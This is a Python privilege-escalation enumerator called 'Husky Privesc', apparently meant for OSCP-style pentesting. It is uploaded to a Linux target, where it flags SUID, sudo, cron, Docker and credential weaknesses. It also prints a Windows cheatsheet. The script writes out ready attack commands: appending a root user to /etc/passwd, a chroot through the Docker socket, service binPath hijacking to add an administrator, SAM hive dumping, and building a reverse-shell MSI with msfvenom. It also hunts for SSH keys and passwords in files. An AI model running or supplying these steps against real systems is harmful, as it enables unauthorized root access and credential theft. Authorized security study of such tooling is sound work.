#!/usr/bin/env python3
"""
Husky Privesc — lightweight privilege escalation enumerator.

Upload to a Linux target and run — checks SUID, sudo, capabilities,
crons, writable paths, kernel info, internal services, credentials,
and flags GTFOBins-exploitable binaries. Also has a Windows command
cheatsheet mode for copy-paste privesc enum on Windows targets.

Lighter than linPEAS, focused on what actually gets you root on OSCP.

Zero dependencies — pure Python 3 stdlib. Upload and run.
"""

import grp
import os
import platform
import pwd
import re
import socket
import subprocess
import sys
import stat

# ───────────────── ANSI helpers ───────────────────────────

_C = os.isatty(1)

def _a(code, t): return f"\033[{code}m{t}\033[0m" if _C else t
def red(t):     return _a("91", t)
def green(t):   return _a("92", t)
def yellow(t):  return _a("93", t)
def cyan(t):    return _a("96", t)
def magenta(t): return _a("95", t)
def bold(t):    return _a("1", t)
def dim(t):     return _a("2", t)

BANNER = f"""
{cyan('    __  ____  _______ __ ____  __')}
{cyan('   / / / / / / / ___// //_/')}\\{cyan(' \\ \\/ /')}
{cyan('  / /_/ / / / /\\__ \\/ ,<')}   {cyan(' \\  /')}
{cyan(' / __  / /_/ /___/ / /| |')}  {cyan(' / /')}
{cyan('/_/ /_/\\____//____/_/ |_|')} {cyan('/_/')}
{red('    __  _____   ________ __ __________')}
{red('   / / / /   | / ____/ //_// ____/ __ \\\\')}
{red('  / /_/ / /| |/ /   / ,<  / __/ / /_/ /')}
{red(' / __  / ___ / /___/ /| |/ /___/ _, _/')}
{red('/_/ /_/_/  |_\\____/_/ |_/_____/_/ |_|')}

    {bold('P R I V E S C   E N U M E R A T O R')}
    {dim('Find the path. Take the crown.')}
"""

FINDINGS = []

def section(title):
    print(f"\n  {bold(cyan(f'═══ {title} ═══'))}")

def hit(severity, msg, detail=""):
    """Register a finding. severity: CRITICAL, HIGH, MEDIUM, INFO."""
    colors = {"CRITICAL": red, "HIGH": yellow, "MEDIUM": cyan, "INFO": dim}
    color_fn = colors.get(severity, dim)
    FINDINGS.append((severity, msg, detail))
    print(f"  {color_fn(f'[{severity}]')} {msg}")
    if detail:
        for line in detail.strip().split("\n"):
            print(f"    {dim('→')} {line}")

def info(msg):
    print(f"  {dim('[*]')} {msg}")

def cmd(command, timeout=5):
    """Run a command and return output."""
    try:
        result = subprocess.run(
            command, shell=True, capture_output=True,
            text=True, timeout=timeout
        )
        return result.stdout.strip()
    except Exception:
        return ""


# ═══════════════════════════════════════════════════════════
#              GTFOBINS QUICK LOOKUP
# ═══════════════════════════════════════════════════════════

# Binaries that can be abused for privesc via SUID or sudo
GTFOBINS_SUID = {
    "aa-exec", "ab", "agetty", "alpine", "ar", "arj", "arp", "as",
    "ascii-xfr", "ash", "aspell", "atobm", "awk", "base32", "base64",
    "basenc", "bash", "bridge", "busybox", "bzip2", "cabal", "capsh",
    "cat", "chmod", "chown", "chroot", "clamscan", "cmp", "column",
    "comm", "cp", "cpio", "cpulimit", "crash", "csh", "csplit",
    "csvtool", "cupsfilter", "curl", "cut", "dash", "date", "dd",
    "debugfs", "dialog", "diff", "dig", "distcc", "dmsetup", "docker",
    "dosbox", "ed", "efax", "emacs", "env", "eqn", "espeak",
    "expand", "expect", "file", "find", "fish", "flock", "fmt",
    "fold", "gawk", "gdb", "gimp", "git", "grep", "gtester",
    "gzip", "hd", "head", "hexdump", "highlight", "hping3",
    "iconv", "install", "ionice", "ip", "ispell", "jjs", "join",
    "jq", "jrunscript", "ksh", "ksshell", "kubectl", "ld.so",
    "less", "logsave", "look", "lua", "lualatex", "luatex",
    "make", "mawk", "more", "mosquitto", "msgattrib", "msgcat",
    "msgconv", "msgfilter", "msgmerge", "msguniq", "multitime",
    "mv", "nasm", "nawk", "ncftp", "nft", "nice", "nl", "nm",
    "nmap", "node", "nohup", "ntpdate", "od", "openssl", "openvpn",
    "paste", "perf", "perl", "pg", "php", "pic", "pico",
    "pip", "pkexec", "pnpm", "pr", "python", "python2", "python3",
    "readelf", "restic", "rev", "rlwrap", "rpm", "rpmquery",
    "rsync", "ruby", "run-parts", "rview", "rvim", "sash",
    "scanmem", "sed", "setarch", "sftp", "sg", "shuf", "slsh",
    "smbclient", "socat", "sort", "sqlite3", "ss", "ssh",
    "ssh-keygen", "ssh-keyscan", "sshpass", "start-stop-daemon",
    "stdbuf", "strace", "strings", "sysctl", "systemctl",
    "tac", "tail", "tar", "taskset", "tbl", "tclsh", "tee",
    "terraform", "tftp", "tic", "time", "timeout", "troff",
    "ul", "unexpand", "uniq", "unshare", "update-alternatives",
    "uudecode", "uuencode", "vagrant", "vi", "view", "vigr",
    "vim", "vimdiff", "vipw", "w3m", "wall", "watch", "wc",
    "wget", "whiptail", "xargs", "xdotool", "xmodmap", "xmore",
    "xxd", "yarn", "yash", "zsh", "zsoelim",
}

GTFOBINS_SUDO = GTFOBINS_SUID | {
    "apt", "apt-get", "cpan", "dnf", "dpkg", "easy_install",
    "ftp", "gcc", "journalctl", "knife", "man", "mount",
    "mysql", "nano", "nc", "ncat", "netcat", "npm",
    "passwd", "pip3", "puppet", "rlogin", "service", "snap",
    "socat", "su", "sudo", "tmux", "top", "vi", "vim",
    "yum", "zip", "zypper",
}


def check_gtfobins_suid(binary_path):
    """Check if a SUID binary is in GTFOBins."""
    name = os.path.basename(binary_path)
    return name in GTFOBINS_SUID


def check_gtfobins_sudo(binary_path):
    """Check if a sudo binary is in GTFOBins."""
    name = os.path.basename(binary_path)
    return name in GTFOBINS_SUDO


# ═══════════════════════════════════════════════════════════
#               LINUX ENUMERATION
# ═══════════════════════════════════════════════════════════

def enum_system_info():
    """Basic system information."""
    section("System Information")
    info(f"Hostname: {bold(socket.gethostname())}")
    info(f"OS: {bold(platform.platform())}")
    info(f"Kernel: {bold(cmd('uname -r'))}")
    info(f"Arch: {bold(platform.machine())}")
    info(f"User: {bold(cmd('whoami'))} (uid={os.getuid()}, gid={os.getgid()})")
    info(f"Groups: {bold(cmd('id'))}")
    info(f"Shell: {bold(os.environ.get('SHELL', 'unknown'))}")

    # Check for interesting groups
    groups = cmd("id -nG").split()
    interesting_groups = {"docker", "lxd", "lxc", "disk", "video", "adm",
                         "shadow", "sudo", "wheel", "staff", "root"}
    for g in groups:
        if g in interesting_groups:
            hit("HIGH", f"User is in '{g}' group",
                f"Group '{g}' may allow privilege escalation")

    # Kernel version check for known exploits
    kernel = cmd("uname -r")
    if kernel:
        kernel_exploits = [
            (r"3\.[0-9]+\.", "DirtyCow (CVE-2016-5195) — check kernel 2.6.22 < 4.8.3"),
            (r"4\.[0-9]+\.", "Check for DirtyPipe (CVE-2022-0847) on 5.8+"),
            (r"5\.([8-9]|1[0-6])\.", "DirtyPipe (CVE-2022-0847) — kernel 5.8 to 5.16.11"),
        ]
        for pattern, note in kernel_exploits:
            if re.search(pattern, kernel):
                hit("MEDIUM", f"Kernel {kernel} — {note}")


def enum_sudo():
    """Check sudo permissions."""
    section("Sudo Permissions")
    output = cmd("sudo -l 2>/dev/null", timeout=10)

    if not output or "not allowed" in output.lower() or "password" in output.lower():
        info("sudo -l requires password or is not available")
        return

    print(f"  {dim(output)}")

    # Check for NOPASSWD entries
    nopasswd_lines = [l for l in output.split("\n") if "NOPASSWD" in l]
    if nopasswd_lines:
        for line in nopasswd_lines:
            # Extract the binary path
            match = re.search(r'NOPASSWD:\s*(.*)', line)
            if match:
                binaries = match.group(1).strip()
                hit("CRITICAL", f"sudo NOPASSWD: {binaries}")

                # Check GTFOBins
                for part in binaries.split(","):
                    binary = part.strip().split()[0]
                    binary_name = os.path.basename(binary)
                    if binary_name in GTFOBINS_SUDO:
                        hit("CRITICAL", f"GTFOBins sudo exploit available: {binary_name}",
                            f"https://gtfobins.github.io/gtfobins/{binary_name}/#sudo")

    # Check for ALL
    if "(ALL)" in output or "(ALL : ALL)" in output:
        if "NOPASSWD" in output:
            hit("CRITICAL", "Full sudo NOPASSWD — instant root",
                "sudo su  OR  sudo /bin/bash")

    # Check for env_keep+=LD_PRELOAD
    if "LD_PRELOAD" in output or "LD_LIBRARY_PATH" in output:
        hit("CRITICAL", "LD_PRELOAD/LD_LIBRARY_PATH in env_keep — shared library injection")


def enum_suid():
    """Find SUID/SGID binaries."""
    section("SUID/SGID Binaries")
    output = cmd("find / -perm -4000 -type f 2>/dev/null", timeout=15)

    if not output:
        info("No SUID binaries found")
        return

    binaries = output.strip().split("\n")
    info(f"Found {len(binaries)} SUID binaries")

    gtfo_hits = []
    custom_hits = []

    # Standard SUID binaries to ignore
    standard = {
        "/usr/bin/passwd", "/usr/bin/chsh", "/usr/bin/chfn",
        "/usr/bin/newgrp", "/usr/bin/gpasswd", "/usr/bin/su",
        "/usr/bin/sudo", "/usr/bin/mount", "/usr/bin/umount",
        "/usr/bin/fusermount", "/usr/bin/fusermount3",
        "/usr/lib/dbus-1.0/dbus-daemon-launch-helper",
        "/usr/lib/openssh/ssh-keysign",
    }

    for binary in binaries:
        binary = binary.strip()
        if not binary:
            continue

        name = os.path.basename(binary)

        if binary in standard:
            continue

        if name in GTFOBINS_SUID:
            gtfo_hits.append(binary)
            hit("CRITICAL", f"SUID GTFOBins: {binary}",
                f"https://gtfobins.github.io/gtfobins/{name}/#suid")
        else:
            custom_hits.append(binary)

    if custom_hits:
        hit("MEDIUM", f"{len(custom_hits)} non-standard SUID binary(ies):")
        for b in custom_hits:
            print(f"    {yellow('→')} {b}")


def enum_capabilities():
    """Check file capabilities."""
    section("File Capabilities")
    output = cmd("getcap -r / 2>/dev/null", timeout=10)

    if not output:
        info("No capabilities found")
        return

    for line in output.split("\n"):
        if not line.strip():
            continue

        dangerous_caps = ["cap_setuid", "cap_setgid", "cap_dac_override",
                         "cap_dac_read_search", "cap_sys_admin", "cap_sys_ptrace",
                         "cap_net_raw", "cap_net_bind_service"]

        for cap in dangerous_caps:
            if cap in line.lower():
                binary = line.split()[0] if line.split() else ""
                hit("HIGH", f"Dangerous capability: {line.strip()}",
                    f"Binary: {binary}")
                break


def enum_cron():
    """Check cron jobs for writable scripts or wildcard injection."""
    section("Cron Jobs")

    crontab = cmd("cat /etc/crontab 2>/dev/null")
    if crontab:
        for line in crontab.split("\n"):
            line = line.strip()
            if line and not line.startswith("#") and not line.startswith("SHELL") \
               and not line.startswith("PATH") and not line.startswith("MAILTO"):
                info(f"Crontab: {line}")

                # Check if the script is writable
                parts = line.split()
                if len(parts) >= 7:
                    script_path = parts[6]
                    if os.path.exists(script_path) and os.access(script_path, os.W_OK):
                        hit("CRITICAL", f"Writable cron script: {script_path}",
                            "Inject a reverse shell into this script")

                    # Check for wildcard usage
                    if "*" in " ".join(parts[6:]):
                        hit("HIGH", f"Cron job uses wildcard (*): {line}",
                            "tar wildcard injection or similar may be possible")

    # User crontabs
    cron_dirs = ["/var/spool/cron", "/var/spool/cron/crontabs", "/etc/cron.d"]
    for d in cron_dirs:
        if os.path.exists(d):
            for f in os.listdir(d):
                filepath = os.path.join(d, f)
                if os.access(filepath, os.R_OK):
                    content = cmd(f"cat '{filepath}' 2>/dev/null")
                    if content:
                        info(f"Cron file {filepath}:")
                        for line in content.split("\n"):
                            if line.strip() and not line.startswith("#"):
                                print(f"    {dim(line)}")

    # Systemd timers
    timers = cmd("systemctl list-timers --all 2>/dev/null")
    if timers and "NEXT" in timers:
        info("Active systemd timers found — check for writable service files")


def enum_writable():
    """Find writable files and directories in interesting locations."""
    section("Writable Files & Directories")

    # Writable /etc/passwd
    if os.access("/etc/passwd", os.W_OK):
        hit("CRITICAL", "/etc/passwd is writable!",
            'echo \'hacker:$(openssl passwd -1 password):0:0::/root:/bin/bash\' >> /etc/passwd')

    # Writable /etc/shadow
    if os.access("/etc/shadow", os.W_OK):
        hit("CRITICAL", "/etc/shadow is writable!")

    # Writable /etc/sudoers
    if os.access("/etc/sudoers", os.W_OK):
        hit("CRITICAL", "/etc/sudoers is writable!")

    # World-writable directories in PATH
    path_dirs = os.environ.get("PATH", "").split(":")
    for d in path_dirs:
        if os.path.isdir(d) and os.access(d, os.W_OK):
            # Check if it's not /tmp or home
            if d not in ("/tmp", "/var/tmp") and "/home/" not in d:
                hit("HIGH", f"Writable directory in PATH: {d}",
                    "Place a malicious binary here to hijack commands")

    # Writable service files
    service_dirs = ["/etc/systemd/system", "/lib/systemd/system",
                   "/etc/init.d", "/etc/init"]
    for d in service_dirs:
        if os.path.isdir(d):
            for f in os.listdir(d):
                filepath = os.path.join(d, f)
                if os.access(filepath, os.W_OK) and os.path.isfile(filepath):
                    hit("HIGH", f"Writable service file: {filepath}")


def enum_credentials():
    """Search for credential files and interesting content."""
    section("Credential Hunting")

    # History files
    home = os.path.expanduser("~")
    history_files = [
        f"{home}/.bash_history", f"{home}/.zsh_history",
        f"{home}/.mysql_history", f"{home}/.psql_history",
        "/root/.bash_history",
    ]
    for hf in history_files:
        if os.path.exists(hf) and os.access(hf, os.R_OK):
            size = os.path.getsize(hf)
            if size > 0:
                hit("MEDIUM", f"Readable history: {hf} ({size} bytes)")
                # Search for passwords in history
                content = cmd(f"grep -iE 'pass|pwd|mysql|ssh|su |sudo|ftp|scp' '{hf}' 2>/dev/null | head -10")
                if content:
                    hit("HIGH", f"Possible credentials in {hf}:", content)

    # Config files with potential passwords
    config_targets = [
        "/var/www/html/wp-config.php",
        "/var/www/html/configuration.php",
        "/var/www/html/config.php",
        "/var/www/html/.env",
        "/var/www/html/config/database.yml",
        "/var/www/html/app/config/parameters.yml",
        "/etc/mysql/debian.cnf",
        "/opt/bitnami/apps/*/conf/*.conf",
    ]
    for target in config_targets:
        if os.path.exists(target) and os.access(target, os.R_OK):
            hit("HIGH", f"Readable config: {target}")
            passwords = cmd(f"grep -iE 'password|passwd|pwd|db_pass|secret' '{target}' 2>/dev/null | head -5")
            if passwords:
                for line in passwords.split("\n"):
                    print(f"    {yellow('→')} {line.strip()}")

    # SSH keys
    ssh_dirs = [f"{home}/.ssh", "/root/.ssh"]
    for user_dir in cmd("ls -d /home/*/.ssh 2>/dev/null").split():
        ssh_dirs.append(user_dir)

    for ssh_dir in ssh_dirs:
        if os.path.isdir(ssh_dir):
            for f in ["id_rsa", "id_ecdsa", "id_ed25519", "authorized_keys"]:
                key_path = os.path.join(ssh_dir, f)
                if os.path.exists(key_path) and os.access(key_path, os.R_OK):
                    hit("HIGH" if "id_" in f else "MEDIUM",
                        f"Readable SSH key: {key_path}")

    # Password files
    password_search = cmd(
        "find / -name '*.conf' -o -name '*.config' -o -name '*.ini' "
        "-o -name '*.env' -o -name '*.txt' -o -name '*.xml' -o -name '*.yml' "
        "2>/dev/null | head -50 | xargs grep -liE 'password|passwd|pwd|credential' 2>/dev/null | head -10",
        timeout=15
    )
    if password_search:
        for f in password_search.split("\n"):
            if f.strip():
                info(f"Possible creds in: {f.strip()}")


def enum_network():
    """Check internal services and network info."""
    section("Network & Internal Services")

    # Listening ports
    output = cmd("ss -tlnp 2>/dev/null") or cmd("netstat -tlnp 2>/dev/null")
    if output:
        info("Listening services:")
        for line in output.split("\n"):
            if "LISTEN" in line or "Local Address" in line:
                # Flag internal-only services
                if "127.0.0.1" in line or "::1" in line:
                    port_match = re.search(r':(\d+)\s', line)
                    if port_match:
                        port = port_match.group(1)
                        internal_services = {
                            "3306": "MySQL", "5432": "PostgreSQL",
                            "6379": "Redis", "27017": "MongoDB",
                            "8080": "HTTP-internal", "8443": "HTTPS-internal",
                            "9090": "Prometheus", "11211": "Memcached",
                            "3000": "Dev-app/Gitea/Grafana",
                        }
                        if port in internal_services:
                            hit("MEDIUM", f"Internal {internal_services[port]} on 127.0.0.1:{port}",
                                "May have default creds or be exploitable via port forward")
                print(f"    {dim(line.strip())}")

    # ARP / neighbors
    neighbors = cmd("ip neigh 2>/dev/null || arp -a 2>/dev/null")
    if neighbors:
        info(f"Network neighbors: {neighbors.count(chr(10)) + 1} entries")

    # Routes
    routes = cmd("ip route 2>/dev/null || route -n 2>/dev/null")
    if routes:
        for line in routes.split("\n"):
            if line.strip() and "default" not in line:
                info(f"Route: {line.strip()}")


def enum_docker():
    """Check for Docker/container escape vectors."""
    section("Container & Docker")

    # Are we in a container?
    if os.path.exists("/.dockerenv"):
        hit("INFO", "Running inside a Docker container")
        hit("MEDIUM", "Check for mounted volumes, capabilities, and host networking")

    # Docker socket
    if os.path.exists("/var/run/docker.sock"):
        if os.access("/var/run/docker.sock", os.R_OK):
            hit("CRITICAL", "Docker socket is accessible!",
                "docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh")

    # Docker group
    groups = cmd("id -nG")
    if "docker" in groups.split():
        hit("CRITICAL", "User is in docker group — instant root",
            "docker run -v /:/mnt --rm -it alpine chroot /mnt sh")

    if "lxd" in groups.split() or "lxc" in groups.split():
        hit("CRITICAL", "User is in lxd/lxc group — container escape to root")


def enum_nfs():
    """Check for NFS misconfigurations."""
    section("NFS")
    exports = cmd("cat /etc/exports 2>/dev/null")
    if exports:
        for line in exports.split("\n"):
            if "no_root_squash" in line:
                hit("CRITICAL", f"NFS no_root_squash: {line.strip()}",
                    "Mount from attacker, create SUID binary, execute on target")
            elif line.strip() and not line.startswith("#"):
                info(f"NFS export: {line.strip()}")


def enum_misc():
    """Miscellaneous checks."""
    section("Miscellaneous")

    # PwnKit check
    pkexec_path = "/usr/bin/pkexec"
    if os.path.exists(pkexec_path):
        # Check if vulnerable version
        version = cmd("pkexec --version 2>/dev/null")
        if version:
            info(f"pkexec found: {version}")
            hit("MEDIUM", "pkexec present — check for CVE-2021-4034 (PwnKit)")

    # Python capabilities for import hijacking
    py_paths = cmd("python3 -c 'import sys; print(\"\\n\".join(sys.path))' 2>/dev/null")
    if py_paths:
        for p in py_paths.split("\n"):
            if p and os.path.isdir(p) and os.access(p, os.W_OK):
                hit("HIGH", f"Writable Python module path: {p}",
                    "Place a malicious module to hijack imports run by root")

    # World-writable files owned by root
    output = cmd("find / -writable -user root -type f 2>/dev/null "
                "| grep -vE '/proc/|/sys/|/dev/' | head -20", timeout=15)
    if output:
        for f in output.split("\n"):
            if f.strip():
                hit("MEDIUM", f"Root-owned writable file: {f.strip()}")


# ═══════════════════════════════════════════════════════════
#              WINDOWS CHEATSHEET
# ═══════════════════════════════════════════════════════════

WINDOWS_CHEATSHEET = """
  {bold}{cyan}═══ Windows Privesc Commands ═══{reset}

  {bold}System Info:{reset}
    systeminfo
    whoami /priv
    whoami /groups
    net user
    net localgroup Administrators
    hostname

  {bold}Juicy Privileges (check whoami /priv):{reset}
    {red}SeImpersonatePrivilege{reset}  →  GodPotato / PrintSpoofer / JuicyPotato
      GodPotato.exe -cmd "cmd /c whoami"
      PrintSpoofer64.exe -i -c cmd

    {red}SeBackupPrivilege{reset}      →  Copy SAM/SYSTEM, extract hashes
      reg save HKLM\\SAM C:\\temp\\SAM
      reg save HKLM\\SYSTEM C:\\temp\\SYSTEM

    {red}SeTcbPrivilege{reset}         →  TcbElevation.exe

    {red}SeDebugPrivilege{reset}       →  Migrate into SYSTEM process

    {red}SeLoadDriverPrivilege{reset}  →  Load vulnerable driver

  {bold}Service Exploits:{reset}
    sc qc <service>                     # query service config
    sc query state=all                  # list all services
    wmic service get name,pathname      # find unquoted paths

    # Unquoted service path
    wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "C:\\Windows\\\\"

    # Writable service binary
    icacls "C:\\path\\to\\service.exe"

    # Hijack service binary
    sc config <svc> binPath= "cmd /c net localgroup Administrators <user> /add"
    sc stop <svc> && sc start <svc>

  {bold}Scheduled Tasks:{reset}
    schtasks /query /fo LIST /v
    # Look for writable scripts or binaries in task paths

  {bold}AlwaysInstallElevated:{reset}
    reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
    reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
    # If both = 1: msfvenom -p windows/x64/shell_reverse_tcp ... -f msi > evil.msi
    # msiexec /quiet /qn /i evil.msi

  {bold}Stored Credentials:{reset}
    cmdkey /list                        # saved credentials
    # If found: runas /savecred /user:<user> cmd.exe

    reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon"  # AutoLogon

  {bold}Credential Files:{reset}
    dir /s /b C:\\Users\\*\\Desktop\\*.txt
    dir /s /b C:\\Users\\*\\Documents\\*.txt
    type C:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt
    findstr /si password *.txt *.xml *.ini *.config

    # SAM/SYSTEM backups
    dir C:\\Windows\\Repair\\SAM
    dir C:\\Windows\\System32\\config\\RegBack\\SAM

  {bold}PowerShell History:{reset}
    type %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt
    Get-Content (Get-PSReadLineOption).HistorySavePath

  {bold}Automated Tools:{reset}
    winPEASx64.exe
    Seatbelt.exe -group=all
    SharpUp.exe
    PowerUp.ps1: Invoke-AllChecks
"""


def show_windows_cheatsheet():
    """Print Windows privesc command reference."""
    output = WINDOWS_CHEATSHEET
    if _C:
        output = output.replace("{bold}", "\033[1m").replace("{reset}", "\033[0m")
        output = output.replace("{cyan}", "\033[96m").replace("{red}", "\033[91m")
        output = output.replace("{yellow}", "\033[93m").replace("{dim}", "\033[2m")
    else:
        for tag in ["{bold}", "{reset}", "{cyan}", "{red}", "{yellow}", "{dim}"]:
            output = output.replace(tag, "")
    print(output)


# ═══════════════════════════════════════════════════════════
#                       MAIN
# ═══════════════════════════════════════════════════════════

def run_linux_enum():
    """Run all Linux enumeration checks."""
    enum_system_info()
    enum_sudo()
    enum_suid()
    enum_capabilities()
    enum_cron()
    enum_writable()
    enum_credentials()
    enum_network()
    enum_docker()
    enum_nfs()
    enum_misc()

    # Summary
    print(f"\n  {bold(red('═' * 50))}")
    print(f"  {bold('PRIVESC SUMMARY')}")
    print(f"  {dim('─' * 50)}")

    if FINDINGS:
        severity_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "INFO": 3}
        FINDINGS.sort(key=lambda x: severity_order.get(x[0], 99))

        crits = sum(1 for s, _, _ in FINDINGS if s == "CRITICAL")
        highs = sum(1 for s, _, _ in FINDINGS if s == "HIGH")
        meds = sum(1 for s, _, _ in FINDINGS if s == "MEDIUM")

        print(f"  {red(f'CRITICAL: {crits}')}  {yellow(f'HIGH: {highs}')}  {cyan(f'MEDIUM: {meds}')}")

        if crits:
            print(f"\n  {bold(red('Hit these first:'))}")
            for sev, msg, detail in FINDINGS:
                if sev == "CRITICAL":
                    print(f"    {red('[!!!]')} {msg}")
    else:
        print(f"  {dim('No findings — try manual enum or upload linPEAS')}")

    print(f"  {bold(red('═' * 50))}\n")


def main():
    import argparse
    p = argparse.ArgumentParser(description="Husky Privesc Enumerator")
    p.add_argument("--windows", "-w", action="store_true",
                   help="Show Windows privesc cheatsheet instead of running Linux enum")
    args = p.parse_args()

    print(BANNER)

    if args.windows:
        show_windows_cheatsheet()
    else:
        if os.name != "posix":
            print(f"  {yellow('[!]')} Not a Linux system — showing Windows cheatsheet instead")
            show_windows_cheatsheet()
        else:
            run_linux_enum()


if __name__ == "__main__":
    main()
